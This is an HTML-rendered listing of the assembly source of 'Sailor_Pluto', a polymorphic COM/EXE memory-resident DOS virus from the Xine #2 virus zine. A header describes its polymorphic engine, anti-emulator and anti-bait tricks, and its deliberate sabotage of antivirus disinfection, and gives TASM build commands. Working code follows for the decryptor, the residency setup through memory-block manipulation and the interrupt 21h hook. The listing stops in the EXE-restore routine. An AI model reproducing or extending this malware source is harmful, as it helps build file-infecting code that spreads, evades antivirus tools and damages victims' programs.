<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>pluto.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 027 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Name          : Sailor_Pluto</span><span class="sc0">
</span><span class="sc1">; Author        : b0z0</span><span class="sc0">
</span><span class="sc1">; Group         : iKx</span><span class="sc0">
</span><span class="sc1">; Origin        : Padania, Jan/Feb/Mar 1997</span><span class="sc0">
</span><span class="sc1">; Compile       : Use TASM 3.0</span><span class="sc0">
</span><span class="sc1">;                       tasm /m2 pluto.asm</span><span class="sc0">
</span><span class="sc1">;                       tlink pluto</span><span class="sc0">
</span><span class="sc1">; Description   : This is a polymorphic COM/EXE TSR infector using SMPE</span><span class="sc0">
</span><span class="sc1">;                 (Sailor Moon Polymorphic Engine) version 0.2. Well, what</span><span class="sc0">
</span><span class="sc1">;                 does SMPE do? SMPE will generate quite large decryptors</span><span class="sc0">
</span><span class="sc1">;                 (also some Kb sometime) that contains a lot of garbage</span><span class="sc0">
</span><span class="sc1">;                 code from the most normal one (reg moving, reg math</span><span class="sc0">
</span><span class="sc1">;                 operations, reading/using memory stuff, conditional and</span><span class="sc0">
</span><span class="sc1">;                 normal jumps, calls, pushes &amp; pops, flag operations,</span><span class="sc0">
</span><span class="sc1">;                 sometime maybe an int3, operations with immediates, both</span><span class="sc0">
</span><span class="sc1">;                 with word and byte regs....), up to quite-do-nothing</span><span class="sc0">
</span><span class="sc1">;                 interrupts (many of them... some video, kbd and many</span><span class="sc0">
</span><span class="sc1">;                 dos stuff ones) and has also many antiemulator structures</span><span class="sc0">
</span><span class="sc1">;                 that, currently, are quite succesfull in many cases</span><span class="sc0">
</span><span class="sc1">;                 against various antiviruses. The poly engine will also</span><span class="sc0">
</span><span class="sc1">;                 randomly encrypt some more bytes than we gived as parameters</span><span class="sc0">
</span><span class="sc1">;                 and will also put some more unencrypted bytes after</span><span class="sc0">
</span><span class="sc1">;                 the encrypted stuff. This is of course to make disinfection</span><span class="sc0">
</span><span class="sc1">;                 very hard. To make the poly a little more interesting</span><span class="sc0">
</span><span class="sc1">;                 the maximal random number of instructions between various</span><span class="sc0">
</span><span class="sc1">;                 pieces of code is determinated (01Fh or 03Fh) when the</span><span class="sc0">
</span><span class="sc1">;                 virus goes resident. So generally in some DOS sessions</span><span class="sc0">
</span><span class="sc1">;                 the decryptors will generally look smaller and after some</span><span class="sc0">
</span><span class="sc1">;                 boots created decryptors may be bigger :) Of course we are</span><span class="sc0">
</span><span class="sc1">;                 just changing the max limit, so the medium size of the</span><span class="sc0">
</span><span class="sc1">;                 decryptors will be smaller or bigger, but even with</span><span class="sc0">
</span><span class="sc1">;                 the small limit, decryptors can be (depending on the</span><span class="sc0">
</span><span class="sc1">;                 random generator) quite big. Also the SMPE can use</span><span class="sc0">
</span><span class="sc1">;                 all the registers as counter (just ax won't be used,</span><span class="sc0">
</span><span class="sc1">;                 because it is too needed for ints and such like) and</span><span class="sc0">
</span><span class="sc1">;                 the standard pointers as pointers (bx,di,si,bp). SMPE</span><span class="sc0">
</span><span class="sc1">;                 is able to encrypt the body of the virus from the start</span><span class="sc0">
</span><span class="sc1">;                 forward or also starting from the end downto the start.</span><span class="sc0">
</span><span class="sc1">;                 It can do really quite a lot of different code, give it</span><span class="sc0">
</span><span class="sc1">;                 a look!</span><span class="sc0">
</span><span class="sc1">;                  Apart from the poly random bytes at the end of the body</span><span class="sc0">
</span><span class="sc1">;                 also some random bytes will be put at the end of the original</span><span class="sc0">
</span><span class="sc1">;                 host just before we will put our code. No info about how</span><span class="sc0">
</span><span class="sc1">;                 much of these is present anywhere in the virus, so ,even if</span><span class="sc0">
</span><span class="sc1">;                 the AVs will be in the future able to force my poly in some</span><span class="sc0">
</span><span class="sc1">;                 way, the cleaned files will still be a little dirty :)</span><span class="sc0">
</span><span class="sc1">;                  It may be interesting the COM infection marker. Infact</span><span class="sc0">
</span><span class="sc1">;                 Sailor_Pluto will put the marker (and of course look</span><span class="sc0">
</span><span class="sc1">;                 for it when needed) in a random place in the first 1FFh</span><span class="sc0">
</span><span class="sc1">;                 bytes. This is intended to make disinfection (expecially</span><span class="sc0">
</span><span class="sc1">;                 the CRC based ones) harder. If TBClean is able to go</span><span class="sc0">
</span><span class="sc1">;                 throught the decryptor (very sporadically, because it</span><span class="sc0">
</span><span class="sc1">;                 bail out at various ints and sometimes also crashes)</span><span class="sc0">
</span><span class="sc1">;                 then the virus (using the old stack method) won't let</span><span class="sc0">
</span><span class="sc1">;                 him to restore the real word but something else, so</span><span class="sc0">
</span><span class="sc1">;                 TBClean-ed COMs won't work properly ;) As for example</span><span class="sc0">
</span><span class="sc1">;                 of this anti-crc signature you can get the TBAV CRC</span><span class="sc0">
</span><span class="sc1">;                 files. Infact only first 20h bytes may be reconstructed,</span><span class="sc0">
</span><span class="sc1">;                 so also the dear old CRC-files users will have a very</span><span class="sc0">
</span><span class="sc1">;                 difficoult existence ]:)</span><span class="sc0">
</span><span class="sc1">;                  It has many antibait features:</span><span class="sc0">
</span><span class="sc1">;                   - won't infect files divisible 1000 and 1024</span><span class="sc0">
</span><span class="sc1">;                   - will compare a word of the previously infected</span><span class="sc0">
</span><span class="sc1">;                     file to prevent infecting equal files</span><span class="sc0">
</span><span class="sc1">;                   - files with digits aren't infected</span><span class="sc0">
</span><span class="sc1">;                   - won't infect if the first two letters of the filename</span><span class="sc0">
</span><span class="sc1">;                     are equal to two letters of the previous runned file</span><span class="sc0">
</span><span class="sc1">;                     (prevent infecting different goats with a standard</span><span class="sc0">
</span><span class="sc1">;                     part as filename)</span><span class="sc0">
</span><span class="sc1">;                   - won't infect files beginning with a 'V'. Probable</span><span class="sc0">
</span><span class="sc1">;                     bait or unknown 'V'irus releated program</span><span class="sc0">
</span><span class="sc1">;                   - won't infect files created in the current month. This</span><span class="sc0">
</span><span class="sc1">;                     may slow a little the infection stage, but generally</span><span class="sc0">
</span><span class="sc1">;                     programs (commercial or not) aren't created very</span><span class="sc0">
</span><span class="sc1">;                     recently. On the other side checking just the day as</span><span class="sc0">
</span><span class="sc1">;                     many viruses do may bee too weak as antigoat.</span><span class="sc0">
</span><span class="sc1">;                  The virus won't tunnel the original int21h but will rather</span><span class="sc0">
</span><span class="sc1">;                 try to get it from List_of_Lists_segment:10A0 (as</span><span class="sc0">
</span><span class="sc1">;                 Neurobasher teaches us :)).</span><span class="sc0">
</span><span class="sc1">;                  To prevent damaging COM files under Windroga 95 and such,</span><span class="sc0">
</span><span class="sc1">;                 Sailor_Pluto won't infect COMs if version is &gt;= 7.</span><span class="sc0">
</span><span class="sc1">;                  The poly engine will be encrypted in memory with a 16bit</span><span class="sc0">
</span><span class="sc1">;                 xor and will be decrypted when needed. Of course at each</span><span class="sc0">
</span><span class="sc1">;                 use (decryption and at the end encryption) of the poly the</span><span class="sc0">
</span><span class="sc1">;                 key will be changed. To do this i needed to wrote a simple</span><span class="sc0">
</span><span class="sc1">;                 decryption loop, so i decided (once it was there written</span><span class="sc0">
</span><span class="sc1">;                 and ready) to use it also on the file. So after the quite</span><span class="sc0">
</span><span class="sc1">;                 complex decryptor of the poly engine (that can make add,</span><span class="sc0">
</span><span class="sc1">;                 sub, xor, rol, ror with byte or word. as for ror/rol the</span><span class="sc0">
</span><span class="sc1">;                 key can be also modified in the loop) we will found a</span><span class="sc0">
</span><span class="sc1">;                 classic word xor loop. Nothing special, but will make the</span><span class="sc0">
</span><span class="sc1">;                 removing of the virus again a little bit more timewasting ;)</span><span class="sc0">
</span><span class="sc1">;                  Since the poly does quite large decryptors, reserving</span><span class="sc0">
</span><span class="sc1">;                 a big amount of mem all the time from the installation isn't</span><span class="sc0">
</span><span class="sc1">;                 a good idea. So the poly will allocate (and of course free</span><span class="sc0">
</span><span class="sc1">;                 them when finished) a part of memory where it will store</span><span class="sc0">
</span><span class="sc1">;                 the decryptor and encrypted stuff at any run when the poly</span><span class="sc0">
</span><span class="sc1">;                 is needed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">pluto</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0">
                 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pluto</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">pluto</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">pluto</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">exe_start</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">realstart</span><span class="sc0">
</span><span class="sc5">realstart</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">realstart</span><span class="sc0">     </span><span class="sc1">; bp delta offset</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_normal_encrypt_start</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">crypt_size</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; we will continue there</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">enc_dec_smpe</span><span class="sc0">      </span><span class="sc1">; do the simple xor loop</span><span class="sc0">


</span><span class="sc5">enc_dec_smpe_engine</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; this is called for the poly encryption. pointer</span><span class="sc0">
                        </span><span class="sc1">; end lenght are already set up for it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smpe_encrypted_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,((</span><span class="sc5">smpe_encrypted_end</span><span class="sc4">-</span><span class="sc5">smpe_encrypted_start</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">enc_dec_smpe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">simple_dec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;       xor     word ptr ds:[di],0000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">simple_dec</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">virus_normal_encrypt_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isexe</span><span class="sc0">         </span><span class="sc1">; DI on exe/com marker</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; is com or exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exe_segment_adjust</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">exe_segment_adjust</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                   </span><span class="sc1">; installation check</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SP'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">go_resident</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; if resident it will calculate</span><span class="sc0">
                                            </span><span class="sc1">; the jump offset for us</span><span class="sc0">
</span><span class="sc5">go_resident</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">               </span><span class="sc1">; on PSP</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; to MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; DS on MCB</span><span class="sc0">
</span><span class="sc5">l4mcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0"> </span><span class="sc1">; last MCB?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">last</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l4mcb</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">size_para</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; size in para + 1 for mcb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; = PSP+2</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; = MCB+3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">             </span><span class="sc1">; DH = 'M'</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; "create" last MCB block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; es = virus segment</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; ds points on code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; start of the virus</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">               </span><span class="sc1">; move virus</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; virus segment</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">simple_dec</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; poly isn't enc. yet</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_handler</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Set our int 21h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">086h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">old_int21_off</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">old_int21_seg</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                  </span><span class="sc1">; get list of lists</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10a0h</span><span class="sc0">                </span><span class="sc1">; look for original int21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">        </span><span class="sc1">; first sig</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">originals</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0e8h</span><span class="sc0">     </span><span class="sc1">; check if it is.</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">originals</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">originals</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">orig_21h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">orig_21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">                 </span><span class="sc1">; select if the max number</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; of garbage instructions</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; in the gargage generation</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">dont_add_max</span><span class="sc0">            </span><span class="sc1">; in this session will be</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">                 </span><span class="sc1">; 01fh or 03fh</span><span class="sc0">
</span><span class="sc5">dont_add_max</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">do_garbage</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">   </span><span class="sc1">; store it</span><span class="sc0">

</span><span class="sc5">notinst</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; com or exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">realcom</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; .EXE restore</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">09h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; modify cs</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
